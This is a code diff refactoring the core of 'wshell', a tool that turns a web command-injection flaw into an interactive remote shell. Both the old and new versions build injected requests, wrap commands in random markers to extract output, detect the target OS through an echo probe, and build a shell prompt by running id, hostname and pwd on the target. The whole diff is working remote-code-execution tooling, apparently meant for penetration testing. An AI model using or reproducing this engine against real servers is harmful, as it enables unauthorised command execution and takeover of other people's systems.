@@ -4,168 +4,85 @@ import copy
 import hashlib
 import random
 import re
-from typing import (
-    Any,
-    Dict,
-    List,
-    Mapping,
-    Sequence,
-    Tuple,
-    Type,
-    Union,
-    override,
-)
+from collections.abc import Mapping, Sequence
+from dataclasses import dataclass
+from typing import Any, override
 from urllib.parse import quote as url_encode
 
 from wshell.config import Config
 from wshell.enums import OSEnum
-from wshell.errors import (
-    CommandExecutionError,
-    OsDetectionError,
-    TargetUnreachableError,
-)
+from wshell.errors import CommandExecutionError, OsDetectionError
 from wshell.http.client import HttpClient
 from wshell.log import logger
 
 
+@dataclass(frozen=True)
+class RenderedRequest:
+    """HTTP request ready to be sent to the target."""
+
+    url: str
+    headers: dict[str, str]
+    body_kwargs: dict[str, Any]
+
+
+class ScriptPipeline:
+    """Ordered script execution helper."""
+
+    def __init__(self, scripts: Sequence):
+        self._scripts = list(scripts)
+
+    def run(self, text: str) -> str:
+        for script in self._scripts:
+            text = script(text)
+        return text
+
+
 class CommandInjector:
-    """ HTTP Client with RCE capabilities via {code,command,template} injection """
+    """HTTP client with RCE capabilities via {code,command,template} injection."""
+
     OS = None
     COMMAND_DELIMITER = ";"
     PATH_DELIMITER = "/"
     CURRENT_DIRECTORY_COMMAND = ""
 
-    def __init__(self, config: Config):
-        self.http_client = HttpClient(config)
-        self.url = config.url
-        self.headers = config.headers
-        self.body_params = config.body_params
-        self.method = config.method
+    def __init__(
+        self,
+        config: Config,
+        *,
+        http_client: HttpClient | None = None,
+        detected_os: OSEnum | None = None,
+    ):
+        self.http_client = http_client or HttpClient(config)
+        self.request = config.request
         self.command_placeholder = config.command_placeholder
-        self.input_scripts = config.input_scripts
-        self.output_scripts = config.output_scripts
-        self.use_json = config.use_json
+        self.input_pipeline = ScriptPipeline(config.input_scripts)
+        self.output_pipeline = ScriptPipeline(config.output_scripts)
         self.cwd = "."
-        
+        self.OS = detected_os or type(self).OS
+
         if config.prompt is not None:
-            # overwrite default prompt function
             self.get_prompt = lambda: f"{config.prompt} "
 
-        self._detect_os()
-        config.os = self.OS
-
     def execute(self, cmd: str, strip: bool = True) -> str:
-        """ Execute the specified command on the target
-        :param cmd: the command to execute
-        :param strip: whether the output has to be stripped
-        :return: the output of the command from the target
-        :raise :class:`requests.exceptions.RequestException` in case of connection errors
-        :raise :class:`requests.exceptions.Timeout` in case of timeout expiration
-        """
+        """Execute the specified command on the target."""
 
-        # The command to run is wrapped around some placeholder to be able to correctly identify the command output
-        # even if there is some garbage or the server print the raw command in the response page too.
-        #
-        # Example:
-        #   $ echo 7ddf32e17a6ac5ce04a8ecbf782ca509;id;echo 7ddf32e17a6ac5ce04a8ecbf782ca509
-        #   7ddf32e17a6ac5ce04a8ecbf782ca509\nuid=0(root) gid=0(root) groups=0(root)7ddf32e17a6ac5ce04a8ecbf782ca509\n
-        #
-        # We will then extract every output delimited by '7ddf32e17a6ac5ce04a8ecbf782ca509\n' to get as output:
-        #
-        #   uid=0(root) gid=0(root) groups=0(root)
-        #
-        placeholder = hashlib.md5(f"wshell-{random.random()}".encode("utf-8")).hexdigest()
-        logger.debug(f"Using placeholder: {placeholder}")
-
-        # Remove any comment to avoid problems with placeholders in the resulting final command
-        cmd = self._remove_commented_out(cmd)
-
-        # To make `cd` command works over HTTP shell we need to change to the desired directory
-        # before the execution of every command
-        cmd = f"cd {self.cwd}{self.COMMAND_DELIMITER}{cmd}"
-        logger.debug(f"Executing command: {cmd}")
-        # See issue #17 to know why the leading blank space is necessary. Do not remove it.
-        cmd = f"echo {placeholder}{self.COMMAND_DELIMITER}{cmd}{self.COMMAND_DELIMITER}echo {placeholder} "
-
-        # Run input scripts, if any, in the same order as the user specified
-        for script in self.input_scripts:
-            cmd = script(cmd)
-
-        # We don't know where the command placeholder is, so just try to resolve it anywhere
-        # (GET parameters, POST data and request headers)
-        url = self.url.replace(self.command_placeholder, url_encode(cmd))
-
-        headers: Dict[str, str] = dict()
-        for key, value in self.headers.items():
-            headers[key] = value.replace(self.command_placeholder, cmd)
-
-        # In case of JSON data we could have nested objects, so we need to traverse the dictionary
-        body_params = copy.deepcopy(self.body_params)
-        stack: List[Tuple[Any, Union[str,int,None], Any]] = [(None, None, body_params)]
-        while stack:
-            parent, key, value = stack.pop()
-            if isinstance(value, Mapping):
-                for k, v in value.items():
-                    stack.append((value, k, v))
-            elif isinstance(value, Sequence) and not isinstance(value, str):
-                for i, v in enumerate(value):
-                    stack.append((value, i, v))
-            elif isinstance(value, str):
-                value = value.replace(self.command_placeholder, cmd)
-                if parent is not None:
-                    parent[key] = value
-
-        body_params_kwargs: Dict[str, Any] = {}
-        if self.use_json:
-            body_params_kwargs['json'] = body_params
-        else:
-            body_params_kwargs['data'] = body_params
-
-        try:
-            response = self.http_client.send_request(
-                self.method,
-                url,
-                headers=headers,
-                **body_params_kwargs
-            )
-        except TargetUnreachableError as e:
-            # Re-raise as CommandExecutionError or handle as appropriate for execute method
-            raise TargetUnreachableError(e)
-
-        output = response.text
-
-        # Run output scripts, if any, in the same order as the user specified
-        for script in self.output_scripts:
-            output = script(output)
-
-        match = re.search(
-            # In case output is base64 encoded, newlines are replaced with spaces and it is
-            # necessary to manually specify the underlying OS to make it works
-            fr"{placeholder}(?:\r?\n|\ )(?P<command_output>.*?){placeholder}(?:\r?\n|\ )",
-            output,
-            re.DOTALL
+        placeholder = self._generate_output_placeholder()
+        rendered_command = self._prepare_command(cmd, placeholder)
+        request = self._render_request(rendered_command)
+        response = self.http_client.send_request(
+            self.request.method,
+            request.url,
+            headers=request.headers,
+            **request.body_kwargs,
         )
+        return self._extract_output(response.text, placeholder, strip=strip)
 
-        if not match:
-            logger.debug(f"Got unexpected HTTP response:\n{output}")
-            raise CommandExecutionError("Failed to parse command output")
+    def detect_os(self) -> OSEnum:
+        """Try to identify the remote OS."""
 
-        command_output = match.group("command_output")
-        return command_output if not strip else command_output.strip()
-
-    def _remove_commented_out(self, cmd: str) -> str:
-        """ Remove any commented out part of the command """
-        return re.sub(r"#.*$", "", cmd, flags=re.MULTILINE)
-
-    def _detect_os(self) -> OSEnum:
-        """ Try to identify the remote OS and return the appropriate injector """
         if self.OS:
             return self.OS
 
-        # Running 'echo wsh${WSHELL}ell' will print:
-        #   Linux:       'wshell\n'
-        #   Windows CMD: 'wsh${WSHELL}ell\r\n'
-        #   Windows PSH: 'wshell\r\n'
         logger.info("Target OS not specified, trying to automatically detect it")
         try:
             cmd_output = self.execute("echo wsh${WSHELL}ell", strip=False)
@@ -173,12 +90,9 @@ class CommandInjector:
                 self.OS = OSEnum.LINUX
                 logger.info("Target OS detected as Linux")
             elif cmd_output == "wshell\r\n":
-                logger.info("Target OS detected as Windows (Powershell)")
                 self.OS = OSEnum.WIN_PSH
+                logger.info("Target OS detected as Windows (Powershell)")
         except CommandExecutionError:
-            # We need to re-execute the command due to different command delimiters
-            # used by Linux/Powershell (;) and Command Prompt (&)
-            # (See issue #9) for details
             self.COMMAND_DELIMITER = WindowsCmdCommandInjector.COMMAND_DELIMITER
             cmd_output = self.execute("echo wsh${WSHELL}ell", strip=False)
             if cmd_output == "wsh${WSHELL}ell\r\n":
@@ -193,43 +107,116 @@ class CommandInjector:
 
         return self.OS
 
+    def _generate_output_placeholder(self) -> str:
+        return hashlib.md5(f"wshell-{random.random()}".encode()).hexdigest()
+
+    def _prepare_command(self, cmd: str, placeholder: str) -> str:
+        cmd = self._remove_commented_out(cmd)
+        cmd = f"cd {self.cwd}{self.COMMAND_DELIMITER}{cmd}"
+        logger.debug(f"Executing command: {cmd}")
+        # The command to run is wrapped around some placeholder to be able to correctly identify the
+        # command output even if there is some garbage or the server print the raw command in the
+        # response page too.
+        #
+        # Example:
+        #   $ echo 7ddf32e17a6ac5ce04a8ecbf782ca509;id;echo 7ddf32e17a6ac5ce04a8ecbf782ca509
+        #   7ddf32e17a6ac5ce04a8ecbf782ca509\nuid=0(root) gid=0(root) groups=0(root)7ddf32e17a6ac5ce04a8ecbf782ca509\n
+        #
+        # We will then extract every output delimited by '7ddf32e17a6ac5ce04a8ecbf782ca509\n' to get
+        # as output:
+        #
+        #   uid=0(root) gid=0(root) groups=0(root)
+        #
+        wrapped_command = f"echo {placeholder}{self.COMMAND_DELIMITER}{cmd}{self.COMMAND_DELIMITER}echo {placeholder} "
+        logger.debug(f"Using placeholder: {placeholder}")
+        return self.input_pipeline.run(wrapped_command)
+
+    def _render_request(self, command: str) -> RenderedRequest:
+        headers = {
+            key: value.replace(self.command_placeholder, command)
+            for key, value in self.request.headers.items()
+        }
+        body = replace_placeholder(
+            copy.deepcopy(self.request.body_params), self.command_placeholder, command
+        )
+        body_kwargs = {"json": body} if self.request.use_json else {"data": body}
+        return RenderedRequest(
+            url=self.request.url.replace(self.command_placeholder, url_encode(command)),
+            headers=headers,
+            body_kwargs=body_kwargs,
+        )
+
+    def _extract_output(self, output: str, placeholder: str, *, strip: bool) -> str:
+        output = self.output_pipeline.run(output)
+        match = re.search(
+            rf"{placeholder}(?:\r?\n|\ )(?P<command_output>.*?){placeholder}(?:\r?\n|\ )",
+            output,
+            re.DOTALL,
+        )
+
+        if not match:
+            logger.debug(f"Got unexpected HTTP response:\n{output}")
+            raise CommandExecutionError("Failed to parse command output")
+
+        command_output = match.group("command_output")
+        return command_output if not strip else command_output.strip()
+
+    def _remove_commented_out(self, cmd: str) -> str:
+        """Remove any commented out part of the command."""
+
+        return re.sub(r"#.*$", "", cmd, flags=re.MULTILINE)
+
     def is_linux(self) -> bool:
-        """ Return True if the remote target is detected as Linux """
-        return self._detect_os() is OSEnum.LINUX
+        return self.detect_os() is OSEnum.LINUX
 
     def is_windows_cmd(self) -> bool:
-        """ Return True if the remote target is detected as Windows (with Command Prompt) """
-        return self._detect_os() is OSEnum.WIN_CMD
+        return self.detect_os() is OSEnum.WIN_CMD
 
     def is_windows_psh(self) -> bool:
-        """ Return True if the remote target is detected as Windows (with Powershell) """
-        return self._detect_os() is OSEnum.WIN_PSH
+        return self.detect_os() is OSEnum.WIN_PSH
 
     def is_windows(self) -> bool:
-        """ Return True if the remote target is detected as Windows """
         return self.is_windows_cmd() or self.is_windows_psh()
 
     def change_directory(self, directory: str) -> str:
-        """ Try to change directory and print the actual directory we are jumped in """
+        """Try to change directory and print the resulting path."""
+
         if directory.startswith("."):
             # To make `cd .` and `cd ..` works we need to prepend the current directory
             directory = f"{self.cwd}{self.PATH_DELIMITER}{directory}"
 
-        self.cwd = self.execute(f"cd {directory}{self.COMMAND_DELIMITER}{self.CURRENT_DIRECTORY_COMMAND}")
+        self.cwd = self.execute(
+            f"cd {directory}{self.COMMAND_DELIMITER}{self.CURRENT_DIRECTORY_COMMAND}"
+        )
         logger.debug(f"Directory changed to: {self.cwd}")
         return self.cwd
 
     def current_directory(self) -> str:
-        """ Return the current working directory """
         return self.change_directory(".")
 
     def get_prompt(self) -> str:
-        """ Get the specific prompt string for the target OS """
+        """Get the specific prompt string for the target OS"""
         raise NotImplementedError
 
 
+def replace_placeholder(value: Any, placeholder: str, command: str) -> Any:
+    """Recursively replace the command placeholder inside nested request data."""
+
+    if isinstance(value, Mapping):
+        return {
+            key: replace_placeholder(nested_value, placeholder, command)
+            for key, nested_value in value.items()
+        }
+    if isinstance(value, Sequence) and not isinstance(value, str):
+        return [replace_placeholder(item, placeholder, command) for item in value]
+    if isinstance(value, str):
+        return value.replace(placeholder, command)
+    return value
+
+
 class LinuxCommandInjector(CommandInjector):
-    """ Linux HTTP Client with RCE capabilities via {code,command,template} injection """
+    """Linux HTTP client with RCE capabilities."""
+
     OS = OSEnum.LINUX
     CURRENT_DIRECTORY_COMMAND = "pwd"
 
@@ -237,13 +224,15 @@ class LinuxCommandInjector(CommandInjector):
     def get_prompt(self):
         # Outputs like "www-data@target:/var/www/html$ "
         # in case of user with no username it will use the user ID
-        id = self.execute('id', strip=True)
-        user_name_or_id = re.match(r"^uid=(?P<user_id>\d+)(\((?P<username>.*?)\))? ", id)
-
-        user = user_name_or_id.group("username") or user_name_or_id.group("user_id") if user_name_or_id else "unknown"
-
-        host = self.execute('hostname', strip=True)
-        pwd  = self.execute('pwd', strip=True)
+        user_info = self.execute("id", strip=True)
+        user_name_or_id = re.match(r"^uid=(?P<user_id>\d+)(\((?P<username>.*?)\))? ", user_info)
+        user = (
+            user_name_or_id.group("username") or user_name_or_id.group("user_id")
+            if user_name_or_id
+            else "unknown"
+        )
+        host = self.execute("hostname", strip=True)
+        pwd = self.execute("pwd", strip=True)
         return f"{user}@{host}:{pwd}{'$' if user not in ('root', '0') else '#'} "
 
     @override
@@ -255,7 +244,8 @@ class LinuxCommandInjector(CommandInjector):
 
 
 class WindowsCmdCommandInjector(CommandInjector):
-    """ Windows (with Command Prompt) HTTP Client with RCE capabilities via {code,command,template} injection """
+    """Windows Command Prompt HTTP client with RCE capabilities."""
+
     OS = OSEnum.WIN_CMD
     COMMAND_DELIMITER = "&"
     PATH_DELIMITER = "\\"
@@ -268,7 +258,7 @@ class WindowsCmdCommandInjector(CommandInjector):
         #   @REM <comment>
         #   :: <comment>
         #   command& REM <comment>
-        return re.sub(r"(&\s*)?(@?REM|::).*$", "", cmd, flags=re.MULTILINE|re.IGNORECASE)
+        return re.sub(r"(&\s*)?(@?REM|::).*$", "", cmd, flags=re.MULTILINE | re.IGNORECASE)
 
     @override
     def get_prompt(self):
@@ -277,7 +267,8 @@ class WindowsCmdCommandInjector(CommandInjector):
 
 
 class WindowsPshCommandInjector(CommandInjector):
-    """ Windows (with Powershell) HTTP Client with RCE capabilities via {code,command,template} injection """
+    """Windows PowerShell HTTP client with RCE capabilities."""
+
     OS = OSEnum.WIN_PSH
     PATH_DELIMITER = "\\"
     # On Powershell `Get-Location` returns a multiline string like:
@@ -298,28 +289,26 @@ class WindowsPshCommandInjector(CommandInjector):
         return f"PS {self.current_directory()}> "
 
 
-def get_command_injector(config: Config) -> CommandInjector:
-    """ Return an initialized command injector for the specified OS or auto-discover the more appropriate one """
-    os_injector_map: Dict[OSEnum, Type[CommandInjector]] = {
+class InjectorFactory:
+    """Create the correct injector instance without repeated OS detection."""
+
+    _os_injector_map: dict[OSEnum, type[CommandInjector]] = {
         OSEnum.LINUX: LinuxCommandInjector,
         OSEnum.WIN_CMD: WindowsCmdCommandInjector,
-        OSEnum.WIN_PSH: WindowsPshCommandInjector
+        OSEnum.WIN_PSH: WindowsPshCommandInjector,
     }
 
-    if config.os:
-        injector_class = os_injector_map.get(config.os)
-        if not injector_class:
-            raise OsDetectionError(f"Unknown OS: {config.os}")
-        return injector_class(config)
+    @classmethod
+    def build(cls, config: Config) -> CommandInjector:
+        http_client = HttpClient(config)
+        detected_os = config.os or CommandInjector(config, http_client=http_client).detect_os()
+        injector_class = cls._os_injector_map.get(detected_os)
+        if injector_class is None:
+            raise OsDetectionError(f"Unknown OS: {detected_os}")
+        return injector_class(config, http_client=http_client, detected_os=detected_os)
 
-    base_injector = CommandInjector(config)
 
-    if not base_injector.OS:
-        raise OsDetectionError("Automatic OS detection failed")
-    
-    specific_injector_class = os_injector_map.get(base_injector.OS)
+def get_command_injector(config: Config) -> CommandInjector:
+    """Return an initialized command injector for the specified or detected OS."""
 
-    if not specific_injector_class:
-        raise OsDetectionError(f"Detection resulted in an unknown OS: {base_injector.OS}")
-    
-    return specific_injector_class(config)
+    return InjectorFactory.build(config)
